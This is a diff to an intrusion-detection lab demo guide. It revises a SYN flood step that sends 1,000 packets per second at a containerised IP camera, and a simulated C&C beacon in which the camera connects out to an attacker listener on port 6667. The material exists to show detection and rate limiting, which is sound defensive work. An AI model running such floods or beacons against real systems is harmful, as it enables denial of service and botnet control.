@@ -1839,35 +1839,38 @@ Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
 
 ---
 
-### Attack 2: Launching a Live DDoS SYN Flood (Scapy Direct Attack)
+### Attack 2: Launching a Live DDoS SYN Flood (Raw Socket Flood)
 
 #### 💡 Why We Are Doing This:
-Demonstrates that when an attacker launches a high-rate SYN flood attempting to crash the camera, the system detects and classifies it as a DDoS attack.
+Demonstrates that when an attacker launches a high-rate SYN flood attempting to crash the camera, the system detects and classifies it as a DDoS attack, pushing a live alert to the dashboard and rate-limiting the source on the router.
 
 #### ⚙️ What Happens Under the Hood:
-Python Scapy library sends 50 raw TCP SYN packets to the camera at 10 millisecond intervals.
+The attack server container uses raw TCP sockets (`/lab/syn_flood.py`) to transmit 1,000 raw TCP SYN packets per second to camera port 80 for 5 seconds (5,000 total packets).
 
 #### 💻 Terminal Command to Execute:
 ```powershell
-docker exec ids-lab-attacker python -c "from scapy.all import IP, TCP, send; send(IP(src='10.10.10.50', dst='192.168.50.30')/TCP(sport=12345, dport=80, flags='S'), count=50, inter=0.01, verbose=False); print('DDoS SYN Flood Sent: 50 Raw SYN Packets')"
+docker exec ids-lab-attack-server python -u /lab/syn_flood.py 192.168.50.30 --port 80 --rate 1000 --seconds 5
 ```
 
 ##### 🔍 Line-by-Line Breakdown:
-- `from scapy.all import IP, TCP, send`: Uses Python Scapy packet crafting library.
-- `IP(src='10.10.10.50', dst='192.168.50.30')`: Creates IP packet header from attacker to camera.
-- `TCP(sport=12345, dport=80, flags='S')`: Crafts TCP packet with SYN flag targeting port 80.
-- `send(..., count=50, inter=0.01)`: Transmits 50 packets to camera at 10 millisecond intervals.
+- `docker exec ids-lab-attack-server`: Targets the attack server container running in the attacker network namespace (`10.10.10.50`).
+- `python -u /lab/syn_flood.py 192.168.50.30`: Runs the high-speed raw socket flood script aimed at the IP camera.
+- `--port 80`: Targets the camera's HTTP web interface.
+- `--rate 1000 --seconds 5`: Generates 1,000 SYN packets per second for 5 seconds (5,000 total packets).
 
 ##### 📋 Verified Output:
 ```text
-DDoS SYN Flood Sent: 50 Raw SYN Packets
+SYN flood 10.10.10.50 -> 192.168.50.30:80, 1000/s for 5 s
+sent 5001 SYN packets in 5.0 s
 ```
 
 #### 🖥️ Dashboard Live UI Demonstration:
 1. **Live Alerts Page (`http://localhost:5000/alerts`):**
-   - The moment SYN Flood is fired, a red **`DDoS_DoS`** alert badge with 100.00% confidence is pushed to screen via WebSocket.
+   - The moment SYN Flood is fired, a red **`DDoS_DoS`** alert badge is pushed to screen via WebSocket in real time.
 2. **Overview Page (`http://localhost:5000/overview`):**
    - Demonstrate the increment in **"Total Attacks"** counter and **"Rate Limit Events"**.
+3. **Router Rate Limit Check (`ids-lab-router`):**
+   - Run `docker exec ids-lab-router nft list set inet ids limit_src` to prove the router kernel autonomously applied the rate-limit rule on `10.10.10.50` with an active expiration timer.
 
 ---
 
@@ -1885,13 +1888,14 @@ docker exec ids-lab-router nft list set inet ids block_dst
 #### Step 2: Transmit Live C&C Outbound Beaconing from Camera to Attacker:
 ```powershell
 # 1. Open Port 6667 Listener in Attacker Container:
-docker exec -d ids-lab-attacker python -c "import socket; s=socket.socket(); s.bind(('0.0.0.0', 6667)); s.listen(1); s.accept()"
+docker exec -d ids-lab-attack-server python -c "import socket; s=socket.socket(); s.bind(('0.0.0.0', 6667)); s.listen(1); s.accept()"
 
 # 2. Send authentic TCP C&C Beacon from infected camera to Attacker:
 docker exec ids-lab-camera python -c "import socket; s=socket.socket(); s.connect(('10.10.10.50', 6667)); s.sendall(b'HELO_CNC\n')"
 ```
 
 ##### 🔍 Line-by-Line Breakdown:
+- `docker exec -d ids-lab-attack-server`: Uses the attack server container with Python support.
 - `s.bind(('0.0.0.0', 6667))`: Opens Port 6667 on attacker machine to listen as Botnet Master Server.
 - `s.connect(('10.10.10.50', 6667))`: Infected camera establishes outbound connection through router to attacker port 6667.
 - `s.sendall(b'HELO_CNC\n')`: Camera transmits botnet check-in beacon packet.
